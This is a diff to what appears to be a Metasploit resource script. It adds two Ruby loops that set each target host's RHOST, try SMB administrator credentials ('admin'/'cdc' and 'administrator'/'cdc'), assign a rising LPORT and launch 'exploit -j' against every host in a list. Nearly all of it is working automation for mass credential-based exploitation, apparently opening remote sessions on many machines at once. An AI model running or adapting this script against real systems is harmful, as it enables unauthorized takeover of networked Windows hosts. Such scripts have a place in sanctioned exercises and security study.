@@ -31,4 +31,24 @@ self.run_single("set LPORT #{port_start}")
 self.run_single("exploit -j")
 end
 end
+
+hosts.each do |rhost|
+port_start +=1
+self.run_single("set RHOST #{rhost}")
+self.run_single("set SMBUser admin")
+self.run_single("set SMBPass cdc")
+self.run_single("set LPORT #{port_start}")
+self.run_single("exploit -j")
+end
+
+hosts.each do |rhost|
+port_start +=1
+self.run_single("set RHOST #{rhost}")
+self.run_single("set SMBUser administrator")
+self.run_single("set SMBPass cdc")
+self.run_single("set LPORT #{port_start}")
+self.run_single("exploit -j")
+end
+
+
 </ruby>
